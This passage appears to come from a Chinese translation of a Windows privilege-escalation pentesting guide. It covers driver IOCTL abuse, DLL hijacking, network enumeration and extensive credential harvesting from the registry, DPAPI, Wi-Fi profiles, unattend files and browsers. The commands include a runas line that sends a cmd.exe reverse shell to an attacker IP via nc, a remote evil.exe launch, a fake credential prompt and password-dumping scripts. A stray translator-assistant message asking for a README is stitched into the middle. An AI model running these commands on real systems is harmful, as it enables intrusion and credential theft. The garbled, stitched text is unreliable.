DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
针对开发者的缓解措施
- 始终在创建打算受 DACL 限制的设备对象时设置 FILE_DEVICE_SECURE_OPEN。
- 验证调用者上下文以进行特权操作。在允许终止进程或返回句柄之前添加 PP/PPL 检查。
- 限制 IOCTLs（访问掩码、METHOD_*、输入验证），并考虑使用 brokered models 而不是直接授予 kernel privileges。

防御者的检测思路
- 监控 user-mode 对可疑设备名的打开（例如，\\ .\\amsdk*）以及指示滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的允许/拒绝列表。


## PATH DLL Hijacking

如果你对 **PATH 中某个文件夹具有写权限**，你可能能够劫持被进程加载的 DLL 并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts 文件

检查 hosts 文件中是否硬编码了其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

检查外部是否存在 **restricted services**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到。

如果获得 root user 权限，你可以监听任意 port（第一次使用 `nc.exe` 监听 port 时，GUI 会提示是否允许 `nc` 通过 firewall）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中查看 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows vault

摘自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault]\

Windows Vault 存储用于服务器、网站和其他程序的用户凭据，以便 **Windows** 可以 **自动为用户登录**。乍一看，似乎用户可以将他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等存储在其中，以便通过浏览器自动登录。但情况并非如此。

Windows Vault 存储的是 Windows 可以自动为用户登录的凭据，这意味着任何 **需要凭据以访问资源的 Windows 应用程序**（服务器或网站）**都可以使用这个 Credential Manager** & Windows Vault，并使用其中提供的凭据，而不需要用户每次输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用程序想使用 vault，应该以某种方式 **与 credential manager 通信并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 的 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB 共享调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用 `runas` 与提供的一组凭据。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **数据保护 API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要用于 Windows 操作系统中对非对称私钥的对称加密。该加密利用用户或系统的秘密来显著增加熵。

**DPAPI 通过从用户的登录秘密派生出的对称密钥来实现对密钥的加密**。在涉及系统加密的场景中，它使用系统的域认证秘密。

使用 DPAPI 加密的用户 RSA 密钥存放在 `%APPDATA%\Microsoft\Protect\{SID}` 目录下，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与用于保护用户私钥的主密钥位于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，该目录的访问受限，使用 CMD 中的 `dir` 命令无法列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
您可以使用 **mimikatz module** `dpapi::masterkey` 并带上适当的参数 (`/pvk` 或 `/rpc`) 来解密它。

这些由**主密码保护的凭证文件**通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 和适当的 `/masterkey` 来解密。\
你可以 **提取许多 DPAPI** **masterkeys** 从 **memory** 使用 `sekurlsa::dpapi` 模块（如果你是 root）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 常用于 **scripting** 和自动化任务，作为一种便捷的加密凭据存储方式。凭据由 **DPAPI** 保护，这通常意味着它们只能由在创建它们的同一台计算机上的相同用户解密。

要从包含它的文件中 **decrypt** PS credentials，你可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 无线网络
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序 **以 SYSTEM privileges 运行**，许多容易受到 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH 密钥位于注册表

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，因此你应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径下找到任何条目，它很可能是一个已保存的 SSH key。它是以加密方式存储的，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
更多有关此技术的信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行且你希望它在开机时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个技术不再有效。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在非对称密钥认证期间也没有识别出 `dpapi.dll` 的使用。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件： _post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Pasword

曾经有一项功能允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。然而，这种方法存在重大安全缺陷。首先，作为 XML 文件存储在 SYSVOL 中的 Group Policy Objects (GPOs) 可以被任何域用户访问。其次，这些 GPP 中的密码使用 AES256 并通过公开记录的默认密钥进行加密，任何经过身份验证的用户都可以将其解密。这构成了严重的风险，因为可能允许用户获得提权。

为缓解该风险，开发了一个函数来扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，该函数会解密密码并返回一个自定义 PowerShell 对象。该对象包含有关 GPP 和文件位置的详细信息，帮助识别和修复此安全漏洞。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
包含凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

你可以随时 **要求用户输入其 credentials，甚至其他用户的 credentials**，如果你认为他可能知道这些（注意 **直接向客户询问** **credentials** 是非常 **危险**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含 credentials 的文件名**

已知曾在某些时候包含 **passwords**（以 **clear-text** 或 **Base64** 形式）的文件
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
我无法直接读取你的文件系统或仓库。请把 src/windows-hardening/windows-local-privilege-escalation/README.md 的内容粘贴到这里，或者提供要翻译的文本段落。

如果你方便在终端运行命令，可以执行并粘贴输出，例如：
- ls -R src/windows-hardening/windows-local-privilege-escalation
- sed -n '1,200p' src/windows-hardening/windows-local-privilege-escalation/README.md

收到文件内容后我会按要求把相关英文翻译成中文，并保持原有的 markdown/HTML 语法不变。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials 在 RecycleBin 中

你也应该检查 Bin，查找其中的 credentials。

要 **recover passwords** 由多个程序保存的密码，你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**其他可能包含 credentials 的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存放 **Chrome or Firefox** 密码的 dbs。\
还要检查浏览器的历史、书签和收藏夹，因为有些 **passwords are** 可能存储在那里。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是内置在 Windows 操作系统中的一项技术，允许不同语言的软件组件之间进行互通信。每个 COM 组件是 **identified via a class ID (CLSID)**，每个组件通过一个或多个接口暴露功能，这些接口由 interface IDs (IIDs) 标识。

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 插件。我创建此插件以 **automatically execute every metasploit POST module that searches for credentials** 在受害者系统中。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很棒的工具，用于从系统中提取 password。

该工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索若干工具中以明文保存这些数据的 **sessions**, **usernames** 和 **passwords** (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一个以 SYSTEM 身份运行的进程用 `OpenProcess()` 打开了一个新进程并赋予 **full access**。同一个进程**也用** `CreateProcess()` **创建了一个低权限的新进程，但继承了主进程的所有打开句柄**。\
然后，如果你对该低权限进程拥有 **full access**，你可以获取通过 `OpenProcess()` 打开的对受特权进程的句柄并**注入 shellcode**。\
[阅读此示例以获取有关**如何检测并利用此漏洞**的更多信息。](leaked-handle-exploitation.md)\
[阅读这篇**更完整的文章，了解如何测试并滥用以不同权限级别（不仅仅是 full access）继承的进程和线程的更多打开句柄**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

共享内存段，通常称为 **管道（pipes）**，用于进程间通信和数据传输。

Windows 提供一种名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨网络。这类似于客户端/服务器架构，角色被定义为 **named pipe server** 和 **named pipe client**。

当 **client** 通过管道发送数据时，建立该管道的 **server** 有能力在拥有必要的 **SeImpersonate** 权限时**冒充 client 的身份**。识别一个通过你能模拟的管道通信的**特权进程**，一旦该进程与您建立的管道交互，你就有机会通过采用该进程的身份来**获取更高权限**。有关执行此类攻击的说明，请参见[**此处**](named-pipe-client-impersonation.md)和[**此处**](#from-high-integrity-to-system)。

另外，下面的工具允许你**使用像 burp 这样的工具拦截命名管道通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **并且这个工具允许列出并查看所有管道以查找 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 服务（TapiSrv）在 server 模式下暴露 `\\pipe\\tapsrv`（MS-TRP）。远程已认证客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 变成对 `NETWORK SERVICE` 可写的任何现有文件的任意 **4 字节写入**，然后获取 Telephony 管理员权限并以服务身份加载任意 DLL。完整流程：

- 将 `ClientAttach` 的 `pszDomainUser` 设置为可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开它并将其用于异步事件写入。
- 每个事件都会将来自 `Initialize` 的攻击者可控的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient` 注册一个 line app（`Req_Func 61`），触发 `TRequestMakeCall`（`Req_Func 121`），通过 `GetAsyncEvents`（`Req_Func 0`）获取，然后注销/关闭以重复确定性的写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后使用任意 DLL 路径调用 `GetUIDllName` 以作为 `NETWORK SERVICE` 执行 `TSPI_providerUIIdentify`。

更多细节：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

查看页面 **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

可点击的 Markdown 链接被转发到 `ShellExecuteExW`，可能触发危险的 URI 处理程序（例如 `file:`、`ms-appinstaller:` 或任何注册的 scheme），并以当前用户身份执行攻击者控制的文件。参见：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### Monitoring Command Lines for passwords

当以某个用户获得 shell 时，可能存在计划任务或其他正在执行的进程，它们**在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行并将当前状态与先前状态比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过 console 或 RDP），并且 UAC 已启用，在某些版本的 Microsoft Windows 中，可以以非特权用户的身份运行终端或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限并绕过 UAC。另外，不需要安装任何东西，攻击过程中使用的二进制文件是由 Microsoft 签名并发布的。

